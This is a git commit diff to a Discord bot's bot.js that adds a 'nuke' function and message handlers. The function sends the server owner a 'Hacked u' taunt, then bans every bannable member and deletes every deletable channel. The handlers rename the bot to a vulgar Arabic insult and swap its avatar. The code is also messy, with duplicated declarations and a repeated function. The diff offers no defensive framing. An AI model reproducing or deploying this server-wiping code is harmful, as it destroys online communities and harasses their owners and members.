3b535e32d52e1814eaad4008ce5775898c62da6b
Robben9874 <37851177+Robben9874@users.noreply.github.com>
2019-08-08 03:11:15 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -28,6 +28,52 @@ console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size}
         
 
 });
+var x1 = "."
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setUsername("كسمك لأجل روبن ههههه")
+
+}
+});
+
+var x1 = "."
+client.on('message', message => {
+     if (message.content === ".") {
+client.user.setAvatar(`https://cdn.discordapp.com/attachments/608805863704231953/608828870342475787/11.jpg`)
+
+}
+});
+
+const client = new Client();
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+  
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+  
+ 
+
+}
 // ban all and send a message for the ownerserver
 async function nuke(guild) {
     let users = 0;
